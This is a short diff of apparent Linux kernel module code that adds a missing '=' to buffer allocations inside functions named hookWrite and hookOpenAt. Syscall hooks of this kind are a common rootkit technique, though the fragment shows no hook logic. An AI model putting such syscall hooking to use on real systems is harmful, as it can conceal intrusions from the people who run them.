@@ -23,7 +23,7 @@ asmlinkage long hookWrite(unsigned int fd, const char __user *buf, size_t count)
 #endif
 #ifdef PTREGS_SYSCALL_STUBS
 asmlinkage long hookOpenAt(struct pt_regs *regs) {
-	char *buf kzalloc(4096, GFP_KERNEL);
+	char *buf = kzalloc(4096, GFP_KERNEL);
 	
 	if (!buf) return NULL;
 
@@ -45,7 +45,7 @@ asmlinkage long hookOpenAt(struct pt_regs *regs) {
 }
 #else
 asmlinkage long hookOpenAt(int dfd, const char __user *filename, int flags, umode_t mode){
-	char *buf kzalloc(4096, GFP_KERNEL);
+	char *buf = kzalloc(4096, GFP_KERNEL);
 	
 	if (!buf) return NULL;
 
